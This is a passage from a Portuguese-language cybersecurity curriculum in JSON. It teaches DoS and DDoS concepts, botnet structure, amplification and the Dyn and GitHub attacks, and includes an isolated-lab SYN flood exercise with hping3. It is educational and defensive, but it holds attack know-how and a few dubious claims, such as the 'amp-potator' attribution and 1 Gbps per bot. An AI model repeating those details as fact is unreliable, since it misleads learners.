                                "Economia/Gestão: Cálculo de ROI em segurança e análise de custo-benefício de mitigações.",
                                "Gestão de Projetos: Planejamento de resposta a incidentes (IR playbooks).",
                                "Matemática/Estatística: Modelagem de tráfego e predição de perdas.",
                                "Ética: Discussão de impactos sociais de ataques em serviços essenciais."
                              ],
                              "realWorldApplication": "Em uma empresa de e-commerce, ao detectar sobrecarga via monitoramento (CPU 95%), o analista identifica perda potencial de R$50k/hora, ativa mitigação com CDN e rate limiting, restaurando serviços em 30min e evitando churn de clientes."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.3",
                        "name": "Ataque de Negação de Serviço Distribuído (DDoS)",
                        "description": "Evolução do DoS tradicional, onde o ataque é lançado a partir de múltiplas fontes distribuídas (botnets), tornando-o mais difícil de bloquear e amplificando a sobrecarga de recursos no alvo.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.3.1",
                            "name": "Definir Ataque DDoS",
                            "description": "Definir DDoS como um ataque coordenado de várias máquinas infectadas (zumbis) controladas por um botmaster, destacando sua escala e persistência.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Ataques de Negação de Serviço (DoS)",
                                  "subSteps": [
                                    "Pesquise a definição básica de um ataque DoS: sobrecarga de um servidor com tráfego para negar serviço a usuários legítimos.",
                                    "Compare DoS simples (de uma única fonte) com ataques distribuídos.",
                                    "Identifique exemplos históricos de DoS, como floods SYN.",
                                    "Anote as limitações de um DoS tradicional em termos de escala.",
                                    "Visualize um diagrama simples de um ataque DoS usando ferramentas online."
                                  ],
                                  "verification": "Crie um diagrama ou resumo escrito distinguindo DoS de DDoS, confirmando compreensão das diferenças iniciais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Bloco de notas ou ferramenta de diagrama como Draw.io",
                                    "Vídeo introdutório sobre DoS no YouTube"
                                  ],
                                  "tips": "Comece com fontes confiáveis como sites da CERT ou Kaspersky para evitar informações desatualizadas.",
                                  "learningObjective": "Compreender a base de DoS para contextualizar o DDoS.",
                                  "commonMistakes": [
                                    "Confundir DoS com vírus comuns",
                                    "Ignorar a distinção entre fontes únicas e múltiplas",
                                    "Não anotar limitações de escala"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Arquitetura de um Botnet",
                                  "subSteps": [
                                    "Defina botnet como uma rede de dispositivos infectados controlados remotamente.",
                                    "Estude como malware (bot) é distribuído via phishing, downloads maliciosos ou exploits.",
                                    "Descreva o Command and Control (C2) server usado para gerenciar bots.",
                                    "Pesquise tipos de botnets (HTTP, IRC, P2P).",
                                    "Desenhe um fluxograma da formação de um botnet."
                                  ],
                                  "verification": "Desenhe e explique um fluxograma da arquitetura de botnet em uma apresentação curta ou nota.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Internet para pesquisa",
                                    "Ferramenta de desenho (ex: Lucidchart gratuito)",
                                    "Artigos da Krebs on Security"
                                  ],
                                  "tips": "Foque em botnets reais como Mirai para tornar concreto; evite simulações ilegais.",
                                  "learningObjective": "Dominar os componentes estruturais que habilitam ataques distribuídos.",
                                  "commonMistakes": [
                                    "Confundir botnet com vírus isolados",
                                    "Subestimar o papel do C2",
                                    "Ignorar métodos de infecção variados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar os Componentes Chave: Zumbis e Botmaster",
                                  "subSteps": [
                                    "Defina 'zumbis' como máquinas infectadas (computadores, IoT) que enviam tráfego malicioso.",
                                    "Explique o 'botmaster' como o operador que controla o botnet via C2.",
                                    "Liste características dos zumbis: geralmente desatualizados, sem AV forte.",
                                    "Simule conceitualmente um comando do botmaster ativando zumbis.",
                                    "Compare com um exército: botmaster como general, zumbis como soldados."
                                  ],
                                  "verification": "Escreva uma definição precisa de zumbis e botmaster, com analogia, e cite uma fonte.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notas anteriores",
                                    "Vídeos educativos da Cisco Networking Academy",
                                    "Glossário de cibersegurança"
                                  ],
                                  "tips": "Use analogias militares para memorizar; memorize termos exatos para precisão.",
                                  "learningObjective": "Reconhecer os atores principais no ecossistema DDoS.",
                                  "commonMistakes": [
                                    "Chamar botmaster de 'hacker genérico'",
                                    "Confundir zumbis com servidores legítimos",
                                    "Esquecer anonimato do botmaster"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Destacar Escala e Persistência do DDoS",
                                  "subSteps": [
                                    "Explique escala: milhares/milhões de zumbis geram tráfego massivo (Tbps).",
                                    "Descreva persistência: botnets se regeneram com novas infecções.",
                                    "Compare impacto: DoS para baixo em minutos vs DDoS horas/dias.",
                                    "Pesquise métricas de ataques reais (ex: 1.3 Tbps em 2016).",
                                    "Resuma a definição completa de DDoS integrando todos elementos."
                                  ],
                                  "verification": "Formule uma definição verbal ou escrita de DDoS, incluindo todos elementos chave, e teste com auto-perguntas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Dados de ataques famosos (Cloudflare reports)",
                                    "Timer para prática verbal",
                                    "Gravador de voz opcional"
                                  ],
                                  "tips": "Pratique recitando a definição em voz alta para fixar; use números reais para credibilidade.",
                                  "learningObjective": "Sintetizar a definição completa enfatizando unicidades do DDoS.",
                                  "commonMistakes": [
                                    "Subestimar escala real",
                                    "Confundir persistência com duração única",
                                    "Omitir coordenação coordenada"
                                  ]
                                }
                              ],
                              "practicalExample": "No ataque DDoS ao Dyn em 2016, o botmaster usou o malware Mirai para infectar milhões de dispositivos IoT (zumbis como câmeras e roteadores), coordenando um flood de 1.2 Tbps que derrubou sites como Twitter e Netflix por horas, demonstrando escala massiva e persistência apesar de mitigações.",
                              "finalVerifications": [
                                "Explique verbalmente DDoS em 1 minuto, incluindo botnet, zumbis e botmaster.",
                                "Desenhe diagrama de botnet com labels corretos.",
                                "Distinga DoS de DDoS em uma tabela comparativa.",
                                "Cite 2 exemplos reais de DDoS com escalas aproximadas.",
                                "Defina persistência e dê razão pela qual DDoS é difícil de parar.",
                                "Responda quiz de 5 perguntas sobre componentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição: inclui botnet, zumbis, botmaster, escala e persistência (peso 30%).",
                                "Clareza na distinção DoS vs DDoS (20%).",
                                "Uso correto de terminologia técnica (20%).",
                                "Exemplos relevantes e precisos (15%).",
                                "Capacidade de diagramação/visualização (10%).",
                                "Compreensão de implicações (5%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolos TCP/IP e floods.",
                                "Ética e Direito: Discussão sobre legalidade e responsabilidade de botmasters.",
                                "Programação: Análise de malware básico em Python para simulações éticas.",
                                "Matemática: Cálculo de largura de banda e escala exponencial.",
                                "História: Evolução de ciberataques desde 2000."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou e-commerces, profissionais usam essa definição para configurar defesas como scrubbers DDoS (ex: Cloudflare), treinar equipes de SOC e relatar incidentes à CERT, prevenindo perdas financeiras de milhões por hora de downtime."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.5.1.3.2",
                            "name": "Distinguir DoS de DDoS",
                            "description": "Comparar DoS (fonte única ou limitada) com DDoS (fontes distribuídas), enfatizando dificuldades de defesa como falsos positivos em filtros de tráfego.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de um Ataque DoS",
                                  "subSteps": [
                                    "Pesquise a definição oficial de Denial of Service (DoS) de fontes confiáveis como NIST ou OWASP.",
                                    "Identifique os tipos comuns de DoS, como SYN flood, Ping of Death e Smurf attack.",
                                    "Analise como um DoS opera de uma única fonte ou poucas origens limitadas.",
                                    "Registre exemplos históricos de DoS, como o ataque ao Panix em 1996.",
                                    "Desenhe um diagrama simples mostrando o fluxo de tráfego de uma fonte única sobrecarregando o alvo."
                                  ],
                                  "verification": "Crie um resumo de 100 palavras explicando DoS e valide com um colega ou ferramenta de verificação online.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Notebook ou papel para diagrama",
                                    "Documentos NIST SP 800-61"
                                  ],
                                  "tips": "Use analogias como uma única mangueira de incêndio inundando uma casa para visualizar o conceito.",
                                  "learningObjective": "Dominar a definição e mecanismos básicos de um ataque DoS de fonte única.",
                                  "commonMistakes": [
                                    "Confundir DoS com falhas de hardware",
                                    "Ignorar que DoS pode ser amplificado por reflexão, mas ainda de fontes limitadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Natureza Distribuída de um Ataque DDoS",
                                  "subSteps": [
                                    "Defina DDoS como Distributed Denial of Service, destacando o uso de botnets ou múltiplas fontes.",
                                    "Estude componentes como C&C servers, bots infectados e amplificação via protocolos como DNS ou NTP.",
                                    "Liste exemplos de DDoS em larga escala, como o Mirai botnet em 2016.",
                                    "Compare o volume de tráfego: DoS em Gbps vs DDoS em Tbps.",
                                    "Simule conceitualmente um botnet usando ferramentas como um diagrama ou vídeo educativo."
                                  ],
                                  "verification": "Desenvolva um fluxograma de um ataque DDoS e explique verbalmente para si mesmo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Vídeos educativos no YouTube (canais como NetworkChuck)",
                                    "Ferramenta de diagrama como Draw.io",
                                    "Relatórios Krebs on Security"
                                  ],
                                  "tips": "Pense em DDoS como milhares de mangueiras simultâneas de diferentes direções.",
                                  "learningObjective": "Entender a estrutura distribuída e escalabilidade de ataques DDoS.",
                                  "commonMistakes": [
                                    "Achar que todo DoS distribuído é DDoS sem botnets",
                                    "Subestimar o papel de dispositivos IoT em botnets"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças Chave entre DoS e DDoS",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: fonte (única vs distribuída), volume de tráfego, custo para atacante, detecção.",
                                    "Discuta métricas: IP spoofing em ambos, mas amplificação maior em DDoS.",
                                    "Analise assinaturas: tráfego de poucos IPs em DoS vs IPs globais em DDoS.",
                                    "Simule detecção básica usando logs fictícios de tráfego.",
                                    "Identifique cenários onde DoS parece DDoS (ex: reflexão limitada)."
                                  ],
                                  "verification": "Preencha e revise a tabela comparativa, garantindo pelo menos 5 diferenças listadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Excel",
                                    "Amostras de logs de tráfego (de sites como Wireshark samples)"
                                  ],
                                  "tips": "Use cores na tabela para destacar diferenças: vermelho para DoS, azul para DDoS.",
                                  "learningObjective": "Capacitar-se a distinguir DoS de DDoS por meio de comparações diretas.",
                                  "commonMistakes": [
                                    "Focar só em volume, ignorando padrões de origem",
                                    "Confundir DDoS com ataques de camada 7 simples"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Desafios de Defesa e Detecção",
                                  "subSteps": [
                                    "Explique por que filtros de IP funcionam em DoS mas falham em DDoS devido a IPs legítimos spoofados.",
                                    "Discuta falsos positivos: bloquear tráfego legítimo em filtros de taxa.",
                                    "Estude soluções como scrubbing centers, CDN com mitigação e machine learning para anomalias.",
                                    "Avalie métricas de defesa: tempo de mitigação, taxa de falsos positivos.",
                                    "Crie um plano de resposta hipotético para cada tipo de ataque."
                                  ],
                                  "verification": "Redija um parágrafo sobre um desafio específico e proponha uma solução.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Cloudflare ou Akamai sobre DDoS",
                                    "Artigos sobre falsos positivos em IDS/IPS"
                                  ],
                                  "tips": "Considere o dilema: bloquear muito = indisponibilidade; bloquear pouco = ataque bem-sucedido.",
                                  "learningObjective": "Compreender implicações práticas na defesa contra DoS vs DDoS.",
                                  "commonMistakes": [
                                    "Acreditar que blacklisting resolve DDoS",
                                    "Ignorar custos econômicos de defesas avançadas"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Wireshark, capture tráfego simulado: envie pacotes SYN flood de um único IP (DoS) e use hping3 em múltiplas VMs para simular DDoS de 10 IPs. Analise os logs para distinguir padrões de origem e volume, observando como filtros simples bloqueiam DoS mas geram falsos positivos no DDoS.",
                              "finalVerifications": [
                                "Explique verbalmente as 3 principais diferenças entre DoS e DDoS.",
                                "Identifique DoS vs DDoS em um cenário descrito com logs de tráfego.",
                                "Descreva um desafio de defesa único para DDoS envolvendo falsos positivos.",
                                "Crie uma tabela comparativa precisa sem erros.",
                                "Proponha uma estratégia de mitigação para cada ataque.",
                                "Discuta um exemplo real de DDoS e por que não era DoS."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições e diferenças chave (90% correto).",
                                "Compreensão profunda de desafios de defesa, especialmente falsos positivos.",
                                "Uso correto de terminologia técnica (ex: botnet, amplificação).",
                                "Capacidade de aplicar conceitos em exemplos práticos ou simulações.",
                                "Clareza na comunicação de comparações via tabelas ou diagramas.",
                                "Identificação de pelo menos 3 erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de protocolos TCP/IP e roteamento.",
                                "Estatística: Detecção de anomalias em volumes de tráfego.",
                                "Programação: Simulação de ataques com Python/Scapy.",
                                "Ética e Direito: Legislação sobre ciberataques (ex: CFAA nos EUA).",
                                "Gestão de Projetos: Planejamento de respostas a incidentes."
                              ],
                              "realWorldApplication": "Em uma empresa, diferenciar DoS de DDoS permite escolher defesas adequadas: blackholing para DoS simples ou serviços como AWS Shield para DDoS massivos, evitando downtime em e-commerces durante picos como Black Friday, onde ataques distribuídos de botnets IoT podem mascarar tráfego legítimo."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.1",
                              "10.1.5.1.2.1"
                            ]
                          },
                          {
                            "id": "10.1.5.1.3.3",
                            "name": "Descrever Botnets em DDoS",
                            "description": "Explicar o papel de botnets na amplificação de DDoS, incluindo como dispositivos IoT ou computadores comprometidos são usados para gerar tráfego massivo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Básico de Botnet",
                                  "subSteps": [
                                    "Defina botnet como uma rede de dispositivos infectados (bots) controlados remotamente por um atacante via servidor de comando e controle (C&C).",
                                    "Identifique componentes principais: bots individuais, servidor C&C e canais de comunicação (HTTP, IRC ou P2P).",
                                    "Diferencie botnets de malwares isolados, enfatizando a coordenação em massa.",
                                    "Explore motivações comuns: roubo de dados, spam ou ataques DDoS.",
                                    "Pesquise estatísticas recentes sobre tamanho de botnets conhecidas."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo a definição e componentes de uma botnet, citando uma fonte confiável.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet para artigos da Wikipedia ou Krebs on Security",
                                    "Notebook para anotações",
                                    "Vídeo introdutório sobre botnets (ex: YouTube - Cloudflare)"
                                  ],
                                  "tips": "Use a analogia de um 'exército de zumbis' controlado por um necromante para visualizar o controle centralizado.",
                                  "learningObjective": "Dominar a definição e arquitetura fundamental de uma botnet.",
                                  "commonMistakes": [
                                    "Confundir botnet com um vírus standalone sem coordenação.",
                                    "Ignorar o servidor C&C como ponto central de falha.",
                                    "Subestimar o uso de comunicações ofuscadas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Construção e Infecção de Botnets",
                                  "subSteps": [
                                    "Descreva métodos de infecção: phishing, exploits de vulnerabilidades, drive-by downloads ou kits de malware.",
                                    "Explique recrutamento de dispositivos: computadores via trojans ou IoT via senhas padrão fracas.",
                                    "Detalhe o ciclo de vida: infecção silenciosa, conexão ao C&C e espera por comandos.",
                                    "Discuta persistência: rootkits para sobreviver a reinicializações.",
                                    "Examine ferramentas comuns como BlackEnergy ou Zeus para construção."
                                  ],
                                  "verification": "Liste 4 métodos de infecção e crie um fluxograma simples da infecção até o controle.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama online (ex: Draw.io ou Lucidchart gratuito)",
                                    "Artigos sobre malwares botnet (ex: site da Symantec ou Malwarebytes)"
                                  ],
                                  "tips": "Foque em vetores reais como portas abertas em roteadores IoT para relevância prática.",
                                  "learningObjective": "Entender os mecanismos técnicos de formação de uma botnet.",
                                  "commonMistakes": [
                                    "Acreditar que apenas computadores são alvos; IoT é prevalente.",
                                    "Omitir a fase de 'beaconing' para C&C.",
                                    "Confundir infecção inicial com execução do ataque."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Papel das Botnets em Ataques DDoS",
                                  "subSteps": [
                                    "Defina como botnets amplificam DDoS: milhares de bots geram tráfego simultâneo para esgotar recursos da vítima.",
                                    "Descreva tipos de floods: SYN, UDP ou HTTP, coordenados via C&C.",
                                    "Explique amplificação: bots enviam requests que geram respostas maiores (ex: DNS amplification).",
                                    "Compare DDoS sem botnet (limitado) vs. com botnet (escala massiva).",
                                    "Discuta comando de ataque: sinal do C&C ativa todos os bots instantaneamente."
                                  ],
                                  "verification": "Simule verbalmente um comando DDoS de uma botnet de 10.000 bots e calcule tráfego estimado (ex: 1Gbps por bot).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Calculadora ou planilha para estimar tráfego",
                                    "Vídeos demonstrativos de DDoS (ex: canais educacionais como Hak5)"
                                  ],
                                  "tips": "Pense em termos de 'onda de tsunami' de pacotes para visualizar o impacto.",
                                  "learningObjective": "Compreender como botnets transformam DoS em DDoS distribuído e amplificado.",
                                  "commonMistakes": [
                                    "Confundir volume puro com técnicas de amplificação.",
                                    "Ignorar a distribuição geográfica que evade bloqueios IP.",
                                    "Subestimar o papel do C&C na sincronização."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Examinar Exemplos com Dispositivos IoT e Impactos",
                                  "subSteps": [
                                    "Estude botnets IoT como Mirai: explora Telnet/SSDP em câmeras e roteadores.",
                                    "Descreva ataque Dyn 2016: 1.2 Tbps via Mirai, derrubando sites como Twitter.",
                                    "Analise vulnerabilidades IoT: senhas default, falta de atualizações.",
                                    "Discuta detecção: tráfego anômalo de IPs residenciais.",
                                    "Explore evoluções: botnets modulares e evasão de honeypots."
                                  ],
                                  "verification": "Redija um relatório de 200 palavras sobre o caso Mirai, destacando lições para IoT.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Relatórios de incidentes (ex: Cloudflare ou Akamai blogs)",
                                    "Timeline interativa de ataques DDoS"
                                  ],
                                  "tips": "Verifique dispositivos IoT pessoais por senhas default para conexão pessoal.",
                                  "learningObjective": "Aplicar conceitos a casos reais envolvendo IoT em DDoS.",
                                  "commonMistakes": [
                                    "Focar só em PCs; IoT representa >70% de botnets modernas.",
                                    "Omitir impactos econômicos além da indisponibilidade.",
                                    "Confundir botnets com ataques state-sponsored isolados."
                                  ]
                                }
                              ],
                              "practicalExample": "Simule uma mini-botnet educacional usando ferramentas como Wireshark para capturar tráfego simulado de múltiplos VMs enviando pacotes SYN flood coordenados, observando amplificação em um servidor alvo virtual (use ambiente isolado como VirtualBox).",
                              "finalVerifications": [
                                "Explique em 1 minuto o fluxo completo de uma botnet em DDoS.",
                                "Identifique 3 vulnerabilidades IoT exploradas em botnets reais.",
                                "Diferencie botnet DDoS de reflexão/amplificação sem bots.",
                                "Descreva como derrubar uma botnet (ex: sinkholing C&C).",
                                "Calcule impacto de 50.000 bots a 10Mbps cada.",
                                "Liste defesas básicas contra botnets DDoS."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição de componentes e fluxo botnet-DDoS (80%+ acurácia).",
                                "Uso de exemplos reais como Mirai com detalhes corretos.",
                                "Profundidade em substeps, cobrindo infecção, coordenação e amplificação.",
                                "Clareza em verificações e distinção de conceitos relacionados.",
                                "Integração de estatísticas ou casos para realismo.",
                                "Ausência de mitos comuns (ex: botnets só para spam)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/UDP em floods DDoS.",
                                "Desenvolvimento de Software: Análise de malware e engenharia reversa.",
                                "Ética e Direito: Leis anti-botnet (ex: Computer Fraud and Abuse Act).",
                                "Matemática: Cálculos de largura de banda e modelagem de tráfego.",
                                "Gestão de Projetos: Estratégias de mitigação em equipes de segurança."
                              ],
                              "realWorldApplication": "Em empresas como provedores de cloud (AWS, Google), profissionais usam esse conhecimento para configurar firewalls e CDNs que detectam padrões de botnets DDoS, protegendo e-commerces e serviços bancários de perdas milionárias por hora de downtime."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.3"
                            ]
                          },
                          {
                            "id": "10.1.5.1.3.4",
                            "name": "Exemplificar Ataques DDoS Reais",
                            "description": "Citar casos históricos como o ataque ao GitHub em 2018 ou Dyn em 2016, descrevendo volumes de tráfego e técnicas de amplificação usadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar o Ataque DDoS ao GitHub em 2018",
                                  "subSteps": [
                                    "Acesse fontes confiáveis como o blog de Brian Krebs ou o relatório oficial do GitHub.",
                                    "Identifique o pico de tráfego: 1.35 Tbps por 8 minutos.",
                                    "Registre a técnica principal: amplificação Memcached (fator de até 50.000x).",
                                    "Anote o impacto: site indisponível brevemente, mitigado por scrubbers.",
                                    "Colete dados sobre o responsável: atribuído a amp-potator, possivelmente teste."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras com fatos chave verificáveis.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Notebook ou documento digital para anotações"
                                  ],
                                  "tips": "Priorize fontes primárias como relatórios das vítimas para precisão.",
                                  "learningObjective": "Compreender os detalhes técnicos e cronológicos do ataque GitHub.",
                                  "commonMistakes": [
                                    "Confundir volume com outros ataques (ex: 100 Gbps)",
                                    "Ignorar duração curta mas intensa"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar o Ataque DDoS à Dyn em 2016",
                                  "subSteps": [
                                    "Consulte relatórios da Dyn, Akamai e notícias da época (ex: Wired, NYT).",
                                    "Identifique o volume: até 1.2 Tbps em ondas múltiplas ao longo do dia.",
                                    "Registre a técnica: botnet Mirai com amplificação DNS/NTP (fator 50-100x).",
                                    "Anote o impacto: interrupção de serviços como Twitter, Netflix e Reddit.",
                                    "Colete contexto: explorou IoT vulneráveis para formar botnet."
                                  ],
                                  "verification": "Crie uma linha do tempo com 5 eventos chave do ataque.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramentas de busca como Google Scholar para relatórios"
                                  ],
                                  "tips": "Use timeline tools como Trello para organizar fatos cronologicamente.",
                                  "learningObjective": "Dominar os aspectos do botnet Mirai e impactos amplos da Dyn.",
                                  "commonMistakes": [
                                    "Atribuir incorretamente só a Mirai sem mencionar amplificação",
                                    "Subestimar o escopo de serviços afetados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Técnicas de Amplificação e Comparar Ataques",
                                  "subSteps": [
                                    "Explique amplificação: reflexão de tráfego pequeno para grande via protocolos UDP.",
                                    "Compare Memcached (GitHub) vs. DNS/NTP (Dyn): portas, fatores de ganho.",
                                    "Identifique semelhanças: ambos usaram servidores mal configurados públicos.",
                                    "Discuta evoluções: de 2016 para 2018, volumes cresceram com IoT e Memcached.",
                                    "Registre mitigações: scrubbers BGP para GitHub, anycast para Dyn."
                                  ],
                                  "verification": "Preencha uma tabela comparativa com 4 colunas (ataque, volume, técnica, mitigação).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets",
                                    "Anotações dos steps anteriores"
                                  ],
                                  "tips": "Use diagramas simples para visualizar fluxo de amplificação.",
                                  "learningObjective": "Analisar padrões técnicos comuns em DDoS reais.",
                                  "commonMistakes": [
                                    "Confundir reflexão com flooding direto",
                                    "Omitir papel de servidores de amplificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Preparar Exemplificação e Apresentação dos Casos",
                                  "subSteps": [
                                    "Estruture uma narrativa: introdução, detalhes por ataque, comparação, lições.",
                                    "Crie visuais: gráficos de tráfego, diagramas de amplificação.",
                                    "Pratique verbalização: explique em 2 minutos cada ataque.",
                                    "Inclua lições: importância de patching e monitoramento.",
                                    "Teste com auto-perguntas: 'Qual fator de amplificação?'"
                                  ],
                                  "verification": "Grave um vídeo de 3 minutos exemplificando os ataques.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de slides como PowerPoint ou Canva",
                                    "Gravador de tela"
                                  ],
                                  "tips": "Mantenha linguagem acessível, evitando jargões sem explicação.",
                                  "learningObjective": "Capacitar-se a exemplificar ataques DDoS de forma clara e didática.",
                                  "commonMistakes": [
                                    "Sobrecarregar com dados sem contexto narrativo",
                                    "Focar só em fatos sem análise"
                                  ]
                                }
                              ],
                              "practicalExample": "Prepare uma apresentação de 5 slides para uma reunião de equipe de TI, detalhando o ataque GitHub (1.35 Tbps via Memcached) e Dyn (1.2 Tbps via Mirai/DNS), com gráficos de tráfego e lições para hardening de rede.",
                              "finalVerifications": [
                                "Citar corretamente volumes: 1.35 Tbps (GitHub) e 1.2 Tbps (Dyn).",
                                "Explicar amplificação Memcached e DNS com exemplos de fator de ganho.",
                                "Descrever impactos: GitHub breve, Dyn multi-horas afetando grandes sites.",
                                "Listar 3 mitigações usadas em cada caso.",
                                "Comparar evoluções técnicas entre 2016 e 2018.",
                                "Identificar fontes confiáveis usadas na pesquisa."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual em volumes, técnicas e datas (90%+ acurácia).",
                                "Clareza na descrição de mecanismos de amplificação.",
                                "Profundidade na análise comparativa e lições aprendidas.",
                                "Uso de exemplos visuais ou diagramas eficazes.",
                                "Capacidade de verbalizar exemplos de forma concisa e didática.",
                                "Referenciação adequada de fontes primárias."
                              ],
                              "crossCurricularConnections": [
                                "História da Tecnologia: Evolução de botnets e IoT vulnerabilidades.",
                                "Ética e Direito: Responsabilidades legais em ciberataques e disclosure.",
                                "Comunicação/Jornalismo: Reportagem investigativa em incidentes de segurança.",
                                "Matemática: Cálculos de amplificação e modelagem de tráfego."
                              ],
                              "realWorldApplication": "Utilizar em relatórios de threat intelligence, treinamentos de conscientização em empresas ou auditorias de segurança de rede para ilustrar riscos DDoS e justificar investimentos em mitigação como scrubbers e BGP anycast."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.2",
                    "name": "Tipos de Ataques DDoS",
                    "description": "Classificação em volumétricos, de protocolo e de camada de aplicação, com exemplos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.2.1",
                        "name": "Ataques DDoS Volumétricos",
                        "description": "Ataques que buscam saturar a largura de banda disponível da vítima ou da infraestrutura de rede, inundando-a com um volume massivo de tráfego inútil, medido em bits por segundo (bps). Esses ataques não exploram vulnerabilidades específicas, mas sim a capacidade limitada de processamento de tráfego.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.1.1",
                            "name": "Identificar características dos ataques volumétricos",
                            "description": "Reconhecer que esses ataques focam na exaustão de banda larga, utilizando tráfego de baixa sofisticação como pacotes UDP ou ICMP em grande volume, diferenciando-os de outros tipos por não exigirem conexão ou estado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição e objetivo principal de ataques volumétricos",
                                  "subSteps": [
                                    "Leia a definição: ataques que visam exaurir a banda larga disponível da vítima.",
                                    "Identifique o foco: sobrecarga de rede com volume massivo de tráfego, não sofisticação.",
                                    "Anote exemplos iniciais de impacto: lentidão ou interrupção total de serviços online.",
                                    "Compare com negação de serviço simples: DDoS é distribuído de múltiplas fontes.",
                                    "Registre o objetivo final: tornar a infraestrutura de rede inacessível."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo a definição e objetivo em suas próprias palavras.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documento ou slide sobre tipos de DDoS",
                                    "Caderno para anotações"
                                  ],
                                  "tips": "Use analogia de uma estrada entupida por muitos carros lentos para visualizar.",
                                  "learningObjective": "Definir precisamente o que caracteriza um ataque volumétrico DDoS.",
                                  "commonMistakes": [
                                    "Confundir com ataques que exploram vulnerabilidades de aplicação",
                                    "Ignorar o aspecto distribuído (DDoS vs DoS)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar protocolos e características do tráfego usado",
                                  "subSteps": [
                                    "Estude protocolos comuns: UDP (sem conexão) e ICMP (echo requests/replies).",
                                    "Observe baixa sofisticação: pacotes simples, sem necessidade de handshake TCP.",
                                    "Analise volume: milhões de pacotes por segundo para saturar links.",
                                    "Examine payloads: geralmente vazios ou repetitivos para maximizar volume.",
                                    "Pratique listando 3 protocolos não volumétricos para contraste (ex: SYN floods)."
                                  ],
                                  "verification": "Liste 4 características do tráfego e associe a pelo menos 2 protocolos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagramas de protocolos UDP/ICMP",
                                    "Ferramenta Wireshark para visualização simulada"
                                  ],
                                  "tips": "Lembre-se: UDP/ICMP não mantêm estado, facilitando floods massivos.",
                                  "learningObjective": "Reconhecer protocolos de conexão stateless usados em floods volumétricos.",
                                  "commonMistakes": [
